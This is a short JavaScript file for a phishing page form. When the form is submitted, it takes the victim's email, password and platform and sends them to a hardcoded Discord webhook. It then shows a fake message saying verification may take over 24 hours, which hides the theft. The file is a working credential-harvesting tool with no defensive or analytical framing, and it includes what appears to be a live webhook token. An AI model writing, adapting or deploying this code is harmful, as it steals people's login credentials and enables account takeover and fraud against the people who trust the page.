document.addEventListener("DOMContentLoaded", () => {
  const form = document.getElementById("webhookForm");
  if (!form) return console.error("Form not found!");

  form.addEventListener("submit", async (e) => {
    e.preventDefault();

    const email = document.getElementById("eml").value.trim();
    const password = document.getElementById("pss").value.trim();
    const platform = document.getElementById("item1").value.trim();

    if (!email || !password || !platform) return alert("Please fill out all fields.");

    await new Promise(resolve => setTimeout(resolve, 2000));

    const payload = {
      content: `Email: ${email}\nPassword: ${password}\nPlatform: ${platform}`
    };

    try {
      const response = await fetch(
        "https://discord.com/api/webhooks/1428906310769971283/lOl5k0O1MscqgtgWcal6ztARU-8fZ8Jzh-fWc7O41UeoqhmP_9joVa1rmCpU_ZbCSGpp",
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload),
        }
      );
      if (!response.ok) throw new Error(await response.text());
      alert("Verification may take greater than 24 hours.");
    } catch (err) {
      console.error(err);
      alert("Something Went Wrong.");
    }
  });
});
